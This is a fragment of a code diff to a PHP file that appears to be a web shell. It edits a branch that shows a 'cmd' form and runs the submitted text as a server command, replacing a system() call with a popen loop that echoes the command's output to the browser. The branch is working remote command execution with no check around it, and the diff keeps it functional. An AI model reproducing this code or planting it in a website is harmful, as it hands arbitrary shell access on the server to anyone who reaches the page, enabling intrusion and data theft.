@@ -29,7 +29,14 @@ switch( $action )
 		echo "<form action='?$_SERVER[QUERY_STRING]' method='post' ><textarea name='cmd' cols='100' rows='5' >" . htmlentities( $cmd ) . "</textarea><input name='cmd_submit' value='running' type='submit' ></form>"; 
 		if( $cmd_submit ){ 
 			echo '<pre>'; 
-			system( $cmd ); 
+			$process_file = popen( $cmd, 'r' );
+			while( !feof( $process_file ) ) {
+				$retrun = fgets( $process_file );
+				echo $retrun ? "$retrun
+" : '';
+			}
+			pclose( $process_file );
+// 			system( $cmd ); 
 			echo '</pre>'; 
 		}
 		exit(); 
